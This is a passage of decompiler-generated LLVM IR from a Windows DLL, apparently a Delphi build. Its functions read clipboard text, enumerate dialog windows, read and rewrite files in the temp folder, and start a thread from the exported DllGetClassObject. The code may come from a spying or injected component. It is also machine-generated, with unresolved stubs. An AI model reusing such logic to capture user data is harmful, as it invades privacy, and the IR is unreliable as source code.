  ret i32 %10, !insn.addr !1461
}

define i32 @function_406762() local_unnamed_addr {
dec_label_pc_406762:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1462
  ret i32 %0, !insn.addr !1462
}

define i32 @function_406767() local_unnamed_addr {
dec_label_pc_406767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1463
}

define i32 @function_406769() local_unnamed_addr {
dec_label_pc_406769:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1464
}

define i32 @function_406798() local_unnamed_addr {
dec_label_pc_406798:
  %eax.0.reg2mem = alloca i32, !insn.addr !1465
  %0 = call i32 @"@LStrClr"(), !insn.addr !1466
  %1 = call i1 @OpenClipboard(i32* null), !insn.addr !1467
  %2 = icmp eq i1 %1, false, !insn.addr !1468
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1469
  br i1 %2, label %dec_label_pc_4067e2, label %dec_label_pc_4067b5, !insn.addr !1469

dec_label_pc_4067b5:                              ; preds = %dec_label_pc_406798
  %3 = call i32* @GetClipboardData(i32 1), !insn.addr !1470
  %4 = icmp eq i32* %3, null, !insn.addr !1471
  br i1 %4, label %dec_label_pc_4067dd, label %dec_label_pc_4067c2, !insn.addr !1472

dec_label_pc_4067c2:                              ; preds = %dec_label_pc_4067b5
  %5 = call i32* @GlobalLock(i32* nonnull %3), !insn.addr !1473
  %6 = icmp eq i32* %5, null, !insn.addr !1474
  br i1 %6, label %dec_label_pc_4067dd, label %dec_label_pc_4067ce, !insn.addr !1475

dec_label_pc_4067ce:                              ; preds = %dec_label_pc_4067c2
  %7 = call i32 @"@LStrFromPChar"(), !insn.addr !1476
  %8 = call i1 @GlobalUnlock(i32* nonnull %3), !insn.addr !1477
  br label %dec_label_pc_4067dd, !insn.addr !1477

dec_label_pc_4067dd:                              ; preds = %dec_label_pc_4067ce, %dec_label_pc_4067c2, %dec_label_pc_4067b5
  %9 = call i1 @CloseClipboard(), !insn.addr !1478
  %10 = sext i1 %9 to i32, !insn.addr !1478
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1478
  br label %dec_label_pc_4067e2, !insn.addr !1478

dec_label_pc_4067e2:                              ; preds = %dec_label_pc_4067dd, %dec_label_pc_406798
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1479
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_4067e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !1480
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !1480
  %3 = load i32*, i32** @global_var_40813c, align 4
  %4 = icmp eq i32* %3, null, !insn.addr !1481
  %5 = icmp eq i1 %4, false, !insn.addr !1482
  %6 = icmp eq i1 %5, false, !insn.addr !1483
  br i1 %6, label %dec_label_pc_406824, label %dec_label_pc_4067fb, !insn.addr !1483

dec_label_pc_4067fb:                              ; preds = %dec_label_pc_4067e8
  %7 = inttoptr i32 %0 to i8*, !insn.addr !1484
  %8 = call i32* @FindWindowA(i8* %7, i8* %2), !insn.addr !1485
  %9 = icmp eq i32* %8, null, !insn.addr !1486
  %10 = icmp eq i1 %9, false, !insn.addr !1487
  br i1 %10, label %dec_label_pc_406824, label %dec_label_pc_40680e, !insn.addr !1487

dec_label_pc_40680e:                              ; preds = %dec_label_pc_4067fb
  %11 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %12 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %11, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220064 to i32*), i32 0, i32* null), !insn.addr !1488
  br label %dec_label_pc_406824, !insn.addr !1488

dec_label_pc_406824:                              ; preds = %dec_label_pc_40680e, %dec_label_pc_4067fb, %dec_label_pc_4067e8
  %13 = inttoptr i32 %arg1 to i32*, !insn.addr !1489
  store i32 0, i32* %13, align 4, !insn.addr !1489
  ret i32 -2147221231, !insn.addr !1490
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_406850:
  ret i32 0, !insn.addr !1491
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_406854:
  ret i32 0, !insn.addr !1492
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_406858:
  ret i32 0, !insn.addr !1493
}

define i32 @function_40685c() local_unnamed_addr {
dec_label_pc_40685c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1494
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1494
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1494
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1495
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1496
  %3 = add i32 %2, 1, !insn.addr !1496
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1496
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1497
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1498
  ret i32 0, !insn.addr !1499
}

define i32 @function_406881() local_unnamed_addr {
dec_label_pc_406881:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1500
  ret i32 %0, !insn.addr !1500
}

define i32 @function_406886() local_unnamed_addr {
dec_label_pc_406886:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1501
}

define i32 @function_406888(i32 %arg1) local_unnamed_addr {
dec_label_pc_406888:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1502
}

define i32 @function_40688c() local_unnamed_addr {
dec_label_pc_40688c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1503
  %2 = add i32 %1, -1, !insn.addr !1503
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1503
  ret i32 %0, !insn.addr !1504
}

define i32 @function_4068dc() local_unnamed_addr {
dec_label_pc_4068dc:
  %esp.1.reg2mem = alloca i32, !insn.addr !1505
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1506
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1506
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1506
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1507
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1508
  %3 = call i32 @function_4036c8(), !insn.addr !1509
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1510
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1510
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1510
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1511
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1512
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1513
  br i1 %7, label %dec_label_pc_406a7b, label %dec_label_pc_406946, !insn.addr !1513

dec_label_pc_406946:                              ; preds = %dec_label_pc_4068dc
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1511
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1514
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1514
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1515
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1516
  br i1 %12, label %dec_label_pc_406a7b, label %dec_label_pc_406962, !insn.addr !1516

dec_label_pc_406962:                              ; preds = %dec_label_pc_406946
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1517
  %14 = call i32 @function_403720(), !insn.addr !1518
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1519
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1519
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1520
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1520
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1521
  %19 = call i32 @function_4046d4(), !insn.addr !1522
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406a7b

dec_label_pc_406a7b:                              ; preds = %dec_label_pc_406962, %dec_label_pc_406946, %dec_label_pc_4068dc
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1523
  %21 = load i32, i32* %20, align 4, !insn.addr !1523
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1524
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1525
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1525
  store i32 4221597, i32* %23, align 4, !insn.addr !1525
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1526
  ret i32 %24, !insn.addr !1527
}

define i32 @function_406a96() local_unnamed_addr {
dec_label_pc_406a96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1528
  ret i32 %0, !insn.addr !1528
}

define i32 @function_406a9b() local_unnamed_addr {
dec_label_pc_406a9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1529
}

define i32 @function_406a9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1530
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1530
  %3 = load i32, i32* %2, align 4, !insn.addr !1530
  ret i32 %3, !insn.addr !1531
}

define i32 @function_406ad4() local_unnamed_addr {
dec_label_pc_406ad4:
  %esp.2.reg2mem = alloca i32, !insn.addr !1532
  %esp.1.reg2mem = alloca i32, !insn.addr !1532
  %esi.0.reg2mem = alloca i32, !insn.addr !1532
  %esp.0.reg2mem = alloca i32, !insn.addr !1532
  %ebx.0.reg2mem = alloca i32, !insn.addr !1532
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1533
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1534
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1534
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1534
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1535
  %2 = call i32 @function_403c88(), !insn.addr !1536
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1537
  br i1 %3, label %dec_label_pc_406bbd, label %dec_label_pc_406b02, !insn.addr !1537

dec_label_pc_406b02:                              ; preds = %dec_label_pc_406ad4
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1538
  %5 = call i32 @function_4036c8(), !insn.addr !1539
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1540
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1540
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1540
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1541
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1542
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1543
  br i1 %9, label %dec_label_pc_406bbd, label %dec_label_pc_406b3e, !insn.addr !1543

dec_label_pc_406b3e:                              ; preds = %dec_label_pc_406b02
  %10 = call i32 @"@LStrClr"(), !insn.addr !1544
  %11 = call i32 @function_403c90(), !insn.addr !1545
  %12 = icmp slt i32 %11, 0, !insn.addr !1546
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1547
  br i1 %12, label %dec_label_pc_406b88, label %dec_label_pc_406b56, !insn.addr !1547

dec_label_pc_406b56:                              ; preds = %dec_label_pc_406b3e
  %13 = add i32 %11, 1, !insn.addr !1548
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1549
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1549
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1549
  br label %dec_label_pc_406b59, !insn.addr !1549

dec_label_pc_406b59:                              ; preds = %dec_label_pc_406b59, %dec_label_pc_406b56
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1550
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1550
  store i32 0, i32* %15, align 4, !insn.addr !1550
  %16 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1551
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1552
  %18 = add i32 %16, %17, !insn.addr !1552
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1552
  %20 = load i32, i32* %19, align 4, !insn.addr !1552
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1552
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1552
  store i32 %20, i32* %22, align 4, !insn.addr !1552
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1553
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1553
  store i32 ptrtoint (i32* @global_var_406c04 to i32), i32* %24, align 4, !insn.addr !1553
  %25 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1554
  %26 = or i32 %17, 4, !insn.addr !1555
  %27 = add i32 %25, %26, !insn.addr !1555
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1555
  %29 = load i32, i32* %28, align 4, !insn.addr !1555
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1555
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1555
  store i32 %29, i32* %31, align 4, !insn.addr !1555
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1556
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1556
  store i32 ptrtoint ([3 x i8]* @global_var_406c10 to i32), i32* %33, align 4, !insn.addr !1556
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1557
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1558
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1559
  %37 = icmp eq i32 %36, 0, !insn.addr !1559
  %38 = icmp eq i1 %37, false, !insn.addr !1560
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1560
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1560
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1560
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1560
  br i1 %38, label %dec_label_pc_406b59, label %dec_label_pc_406b88, !insn.addr !1560

dec_label_pc_406b88:                              ; preds = %dec_label_pc_406b59, %dec_label_pc_406b3e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1541
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1561
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1562
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1562
  store i32 0, i32* %42, align 4, !insn.addr !1562
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1563
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1563
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1563
  store i32 %45, i32* %44, align 4, !insn.addr !1563
  %46 = call i32 @function_4034c8(), !insn.addr !1564
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1565
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1565
  store i32 %46, i32* %48, align 4, !insn.addr !1565
  %49 = call i32 @function_403720(), !insn.addr !1566
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1567
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1567
  store i32 %49, i32* %51, align 4, !insn.addr !1567
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1568
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1568
  store i32 %39, i32* %53, align 4, !insn.addr !1568
  %54 = call i32 @function_40446c(), !insn.addr !1569
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1570
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1570
  store i32 %39, i32* %56, align 4, !insn.addr !1570
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1571
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1572
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1572
  store i32 %39, i32* %59, align 4, !insn.addr !1572
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1573
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1574
  br label %dec_label_pc_406bbd, !insn.addr !1574

dec_label_pc_406bbd:                              ; preds = %dec_label_pc_406b88, %dec_label_pc_406b02, %dec_label_pc_406ad4
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1575
  %62 = load i32, i32* %61, align 4, !insn.addr !1575
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1576
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1577
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1577
  store i32 4221919, i32* %64, align 4, !insn.addr !1577
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1578
  ret i32 %65, !insn.addr !1579
}

define i32 @function_406bd8() local_unnamed_addr {
dec_label_pc_406bd8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1580
  ret i32 %0, !insn.addr !1580
}

define i32 @function_406bdd() local_unnamed_addr {
dec_label_pc_406bdd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1581
}

define i32 @function_406bdf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bdf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1582
}

define i32 @function_406c14() local_unnamed_addr {
dec_label_pc_406c14:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1583
  %1 = call i32 @function_4036b8(), !insn.addr !1584
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1585
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1585
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1585
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1586
  %4 = call i32 @function_403c90(), !insn.addr !1587
  %5 = icmp slt i32 %4, 0, !insn.addr !1588
  br i1 %5, label %dec_label_pc_406c9c, label %dec_label_pc_406c6a, !insn.addr !1589

dec_label_pc_406c6a:                              ; preds = %dec_label_pc_406c14
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1590
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1591
  br label %dec_label_pc_406ce8

dec_label_pc_406c9c:                              ; preds = %dec_label_pc_406c14
  %8 = call i32 @function_403c88(), !insn.addr !1592
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1593
  %10 = call i32 @function_403c90(), !insn.addr !1594
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1595
  %12 = call i32 @function_403c90(), !insn.addr !1596
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1597
  %14 = call i32 @function_406ad4(), !insn.addr !1598
  br label %dec_label_pc_406ce8, !insn.addr !1598

dec_label_pc_406ce8:                              ; preds = %dec_label_pc_406c6a, %dec_label_pc_406c9c
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1599
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1600
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1601
  ret i32 %16, !insn.addr !1602
}

define i32 @function_406d03() local_unnamed_addr {
dec_label_pc_406d03:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1603
  ret i32 %0, !insn.addr !1603
}

define i32 @function_406d08() local_unnamed_addr {
dec_label_pc_406d08:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1604
}

define i32 @function_406d0a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1605
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1605
  %3 = load i32, i32* %2, align 4, !insn.addr !1605
  ret i32 %3, !insn.addr !1606
}

define i32 @function_406d14() local_unnamed_addr {
dec_label_pc_406d14:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1607
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1607
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1607
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1608
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1609
  %3 = add i32 %2, 1, !insn.addr !1609
  %4 = icmp eq i32 %3, 0, !insn.addr !1609
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1609
  %5 = icmp eq i1 %4, false, !insn.addr !1610
  br i1 %5, label %dec_label_pc_406d4c, label %dec_label_pc_406d2d, !insn.addr !1610

dec_label_pc_406d2d:                              ; preds = %dec_label_pc_406d14
  %6 = load i32, i32* @global_var_408130, align 4, !insn.addr !1611
  %7 = icmp eq i32 %6, 0, !insn.addr !1611
  br i1 %7, label %dec_label_pc_406d3c, label %dec_label_pc_406d37, !insn.addr !1612

dec_label_pc_406d37:                              ; preds = %dec_label_pc_406d2d
  %8 = call i32 @function_406ad4(), !insn.addr !1613
  br label %dec_label_pc_406d3c, !insn.addr !1613

dec_label_pc_406d3c:                              ; preds = %dec_label_pc_406d37, %dec_label_pc_406d2d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1614
  br label %dec_label_pc_406d4c, !insn.addr !1614

dec_label_pc_406d4c:                              ; preds = %dec_label_pc_406d3c, %dec_label_pc_406d14
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1615
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1616
  ret i32 0, !insn.addr !1617
}

define i32 @function_406d5a() local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1618
  ret i32 %0, !insn.addr !1618
}

define i32 @function_406d5f() local_unnamed_addr {
dec_label_pc_406d5f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1619
}

define i32 @function_406d61(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d61:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1620
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1621
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1621
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1621
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1622
  %2 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1623
  %3 = add i32 %2, -1, !insn.addr !1623
  %4 = icmp eq i32 %2, 0, !insn.addr !1623
  store i32 %3, i32* @global_var_4096dc, align 4, !insn.addr !1623
  %5 = icmp eq i1 %4, false, !insn.addr !1624
  br i1 %5, label %dec_label_pc_406d98, label %dec_label_pc_406d7e, !insn.addr !1624

dec_label_pc_406d7e:                              ; preds = %dec_label_pc_406d64
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1625
  br label %dec_label_pc_406d98, !insn.addr !1626

dec_label_pc_406d98:                              ; preds = %dec_label_pc_406d7e, %dec_label_pc_406d64
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1627
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1628
  ret i32 0, !insn.addr !1629
}

define i32 @function_406da6() local_unnamed_addr {
dec_label_pc_406da6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1630
  ret i32 %0, !insn.addr !1630
}

define i32 @function_406dab() local_unnamed_addr {
dec_label_pc_406dab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1631
}

define i32 @function_406dad(i32 %arg1) local_unnamed_addr {
dec_label_pc_406dad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1632
}

define i1 @function_406db0(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406db0:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1633
  ret i1 %0, !insn.addr !1633
}

define i32 @function_406db8() local_unnamed_addr {
dec_label_pc_406db8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1634
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1635
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1636
  %2 = icmp eq i32 %1, 0, !insn.addr !1637
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1638
  br i1 %2, label %dec_label_pc_406dee, label %dec_label_pc_406dd0, !insn.addr !1638

dec_label_pc_406dd0:                              ; preds = %dec_label_pc_406db8
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1635
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1639
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1639
  %7 = load i8, i8* %6, align 1, !insn.addr !1639
  %8 = icmp eq i8 %7, 92, !insn.addr !1639
  br i1 %8, label %dec_label_pc_406de0, label %dec_label_pc_406dd7, !insn.addr !1640

dec_label_pc_406dd7:                              ; preds = %dec_label_pc_406dd0
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1641
  store i8 92, i8* %9, align 1, !insn.addr !1641
  %10 = or i32 %3, 1, !insn.addr !1642
  %11 = add i32 %1, %10, !insn.addr !1642
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1642
  store i8 0, i8* %12, align 1, !insn.addr !1642
  br label %dec_label_pc_406de0, !insn.addr !1642

dec_label_pc_406de0:                              ; preds = %dec_label_pc_406dd7, %dec_label_pc_406dd0
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1643
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1643
  br label %dec_label_pc_406dee, !insn.addr !1643

dec_label_pc_406dee:                              ; preds = %dec_label_pc_406de0, %dec_label_pc_406db8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1644
}

define i32 @function_406df8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406df8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1645
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1646
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1647
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1647
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1647
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1648
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1649
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1649
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1650
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1650
  %5 = icmp eq i1 %4, false, !insn.addr !1651
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1652
  br i1 %5, label %dec_label_pc_406eaf, label %dec_label_pc_406e2f, !insn.addr !1652

dec_label_pc_406e2f:                              ; preds = %dec_label_pc_406df8
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1653
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1653
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1654
  %8 = icmp eq i32 %7, 32770, !insn.addr !1655
  %9 = icmp eq i1 %8, false, !insn.addr !1656
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1656
  br i1 %9, label %dec_label_pc_406eaf, label %dec_label_pc_406e3e, !insn.addr !1656

dec_label_pc_406e3e:                              ; preds = %dec_label_pc_406e2f
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1657
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1657
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1658
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1658
